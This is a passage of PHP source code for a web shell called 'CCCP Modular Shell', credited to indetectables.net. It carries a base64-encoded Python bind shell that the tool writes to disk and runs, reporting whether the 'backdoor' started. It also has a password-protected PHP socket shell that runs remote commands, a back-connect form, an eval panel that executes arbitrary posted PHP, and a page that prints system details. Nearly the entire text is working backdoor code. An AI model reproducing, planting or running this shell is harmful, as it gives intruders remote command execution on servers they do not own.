ICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";

                $bindname = 'bind.py'; //TODO EL NOMBRE TENDRIA QUE SER ALEATORIO
                $fd = fopen($bindname, 'w');
                if ($fd) {
                    fwrite($fd, base64_decode($Python_CODE));

                    if ($isWIN) {
                        $Content .= '[+] OS Detected = Windows';
                        execute('start bind.py');

                        $pattern = 'python.exe';
                        $list = execute('TASKLIST');
                    } else {
                        $Content .= '[+] OS Detected = Linux';
                        execute('chmod +x bind.py ; ./bind.py');

                        // Check if the process is running
                        $pattern = $bindname;
                        $list = execute('ps -aux');
                    }


                    if (preg_match("/$pattern/", $list)) {
                        $Content .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
                    } else {
                        $Content .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';
                    }

                    $Content .= "<br/><br/>\n<b>Task List :-</b> <pre>\n$list</pre>";

                }
            }
        } else
            if (@$_POST['mode'] === 'PHP') {
                // Set the ip and port we will listen on
                if (function_exists("socket_create")) {
                    // Create a TCP Stream socket
                    $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

                    // Bind the socket to an address/port
                    if (socket_bind($sockfd, $address, $port) == false) {
                        $Content .= "Cant Bind to the specified port and address!";
                    }

                    // Start listening for connections
                    socket_listen($sockfd, 17);

                    /* Accept incoming requests and handle them as child processes */
                    $client = socket_accept($sockfd);
                    socket_write($client, 'Password: ');
                    // Read the pass from the client
                    $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
                    if (trim($input) == $pass) {
                        socket_write($client, "\n\n");
                        socket_write($client, ($isWIN) ? execute("date /t & time /t") . "\n" . execute("ver") : execute("date") . "\n" . execute("uname -a"));
                        socket_write($client, "\n\n");
                        while (1) {
                            // Print Command prompt
                            $maxCmdLen = 31337;
                            socket_write($client, '(Shell)[$]> ');
                            $cmd = socket_read($client, $maxCmdLen);
                            if ($cmd == false) {
                                $Content .= 'The client Closed the conection!';
                                break;
                            }
                            socket_write($client, execute($cmd));
                        }
                    } else {
                        $Content .= 'Wrong Password!';
                        socket_write($client, "Wrong Password!\n\n");
                    }
                    socket_shutdown($client, 2);
                    socket_close($socket);

                    // Close the client (child) socket
                    //socket_close($client);
                    // Close the master sockets
                    //socket_close($sock);
                } else {
                    $Content .= "Socket Conections not Allowed/Supported by the server!";
                }
            } else {
                $Content .= '
      <table class="bind" align="center" >
      <tr>
         <th class="header" colspan="1" width="50px">Back Connect</th>
         <th class="header" colspan="1" width="50px">Bind Shell</th>
      </tr>
      <tr>
         <form method="POST">  
          <td>
            <table style="border-spacing: 6px;">
               <tr>
                  <td>IP </td>
                  <td>
                     <input style="width: 200px;" class="cmd" name="ip" value="' . $_SERVER['REMOTE_ADDR'] . '" />
                  </td>
               </tr>
               <tr>
                  <td>Port </td>
                  <td><input style="width: 100px;" class="cmd" name="port" size="5" value="31337"/></td>
               </tr>
               <tr>
               <td>Mode </td>    
               <td>
                     <select name="mode" class="cmd">
                        <option value="PHP">PHP</option>
                     </select>  <input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
               
            </table>
          </td>
          </form> 
          <form method="POST">
          <td>
            <table style="border-spacing: 6px;">
               <tr>
                  <td>Port</td>
                  <td>
                     <input style="width: 200px;" class="cmd" name="port" value="31337" />
                  </td>
               </tr>
               <tr>
                  <td>Passwd </td>
                  <td><input style="width: 100px;" class="cmd" name="passwd" size="5" value="indetectables"/>
               </tr>
               <tr>
               <td>
               Mode
               </td>
               <td>
                     <select name="mode" class="cmd">
                        <option value="PHP">PHP</option>
                        <option value="Python">Python</option>
                     </select>   <input style="width: 90px;" class="own" type="submit" value="Bind :D!"/></td>
               </tr>    
                  
            </table>
          </td>
          </form>
      </tr>
      </table>
      <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
      ';
            }
}

if (@$_POST[$Config['Menu']] === 'eval') {
    function calcRows($ret) {
        $rows = count(explode("\r\n", $ret)) + 1;
        if ($rows < 10) $rows = 10;
        return $rows;
    }

    $Content .= '<h2>Eval PHP Code &raquo;</h2>';

    $code = @trim($_POST['code']);
    if ($code) {
        if (! preg_match('#<\?#si', $code)) {
            $code = "<?php\n\n{$code}\n\n?>";
        }

        //hago esta chapuzada para que no se muestre el resultado arriba
        echo 'Result of the executed code:';
        $buffer = ob_get_contents();

        if ($buffer) {
            ob_clean();
            eval("?" . ">$code");
            $ret = ob_get_contents();
            $ret = convert_cyr_string($ret, 'd', 'w');
            ob_clean();
            $Content .= $buffer;
            if (@$_POST['eval_txt'] === '1') {
                $Content .= '<br><textarea cols="122" rows="' . calcRows($ret) . '" readonly>' . htmlspecialchars($ret) . '</textarea>';
            } else {
                $Content .= $ret . '<br><pre></pre>';
            }
        } else {
            eval("?" . ">$code");
        }
    }

    $Content .= '<form name="form" action="" method="post" >
	<input type="hidden" name="' . $Config['Menu'] . '" value="eval" />
	<p><br>PHP Code:<br>
	<textarea class="area" name="code" cols="122" rows="' . @calcRows($_POST['code']) . '">' . @htmlspecialchars($_POST['code']) . '</textarea></p>
	<p>Display in text-area:&nbsp;<input type="checkbox" name="eval_txt" value="1" ' . ((isset($_POST['eval_txt'])) ? 'checked' : '') . '>&nbsp;&nbsp;
	<a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">[ Get examples ]</a>
	<br><br><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
	</form>';
}


# Imprimo plantilla
echo '<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta http-equiv=Content-Type content="text/html; charset=iso-8859-1">
  <meta http-equiv=Pragma content=no-cache>
  <meta http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
  <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
  <title>CCCP Modular Shell</title>
  <script type="text/javascript">
    function CheckAll(form) {
          for(var i=0;i<form.elements.length;i++) {
                var e = form.elements[i];
                if (e.name != \'chkall\')
                e.checked = form.chkall.checked;
      }
    }
	
	function sendData(action, fields, values){
		temp = "<input type=\'hidden\' name=\'' . $Config['Action'] . '\' value=\'" + action + "\'/>";
		for (i = 0; i <= fields.length - 1; i++) {
			temp += "<input type=\'hidden\' name=\'" + fields[ i ] + "\' value=\'" + values[ i ] + "\'/>";
		}
		
		document.dummy.innerHTML = temp;
		document.dummy.submit();
	}
	    
    ' . $Javascript . '
  </script>
  <style type="text/css">
    body { background-color: #000000; }
    body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px; }
	td { font-size: 8pt; color: #ebebeb; font-family: verdana; }
    td.header { font-weight: normal; font-size: 10pt; background: #7d7474; color: white; font-family: verdana; }
    A { font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none; }
    A:unknown { font-weight: normal; color: #ffffff; font-family: verdana; text-decoration: none; }
    A.Links { color: #ffffff; text-decoration: none; }
    A.Links:unknown { font-weight: normal; color: #ffffff; text-decoration: none; }
    A:hover { color: #ffffff; text-decoration: underline; }
    input { background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; }
    textarea { background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; }
    button { background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; }
    select { background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; }
    option { background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; }
    iframe { background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; }
    p { margin-top: 0px; margin-bottom: 0px; size-height: 150%}
    blockquote { font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0; }
    .skin0 { position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden; }
    .skin1 { cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-SIZE: 10px; color: black; }
    .menuitems { padding-left:15px; padding-right:10px; }
	.alt1 td { background:#7d7474;padding:5px 10px 5px 5px; }
	.alt2 td { background:#7d7f74;padding:5px 10px 5px 5px; }
	.focus td { background:#8080FF;padding:5px 10px 5px 5px; }
  </style>
</head>
<body>
  <form name="dummy" method="post"></form>
  <center>
    <table style="border-collapse: collapse" height="1" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
      <tr>
        <th width="100%" height="15" nowrap="nowrap" bordercolor="#C0C0C0" valign="top" colspan="2">
          <p><font face="Verdana" size="5"><b>CCCP Modular Shell</b></font></p>
        </th>
      </tr>

      <tr>
        <td>
          <p align="left"><b>Software: </b><a href="?' . $Config['Menu'] . '=phpinfo" target="_blank"><b>' . $_SERVER['SERVER_SOFTWARE'] . '</b></a></p>
          <p align="left"><b>uname -a: ' . php_uname() . '</b></p>
          <p align="left"><b>Safe-mode: ' . getcfg('safe_mode') . '</b></p>
          <br><center>' . $sysMenu . '</center></p>
        </td>
      </tr>
    </table>

    <table style="border-collapse: collapse" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
      <tr>
        <td width="100%">
          ' . $Content . '
        </td>
      </tr>
    </table>

    <table>
      <tr>
        <td valign="top">
          <p align="center">
            --[ <a href="http://indetectables.net" target="_blank">CCCP Modular Shell v1.0 by DSR!</a> <b>|</b> Generation time: ' . substr((microtime(true) - $tiempoCarga), 0, 4) . ' ]--
          </p>
        </td>
      </tr>
    </table>
  </center>
</body>
</html>';
?>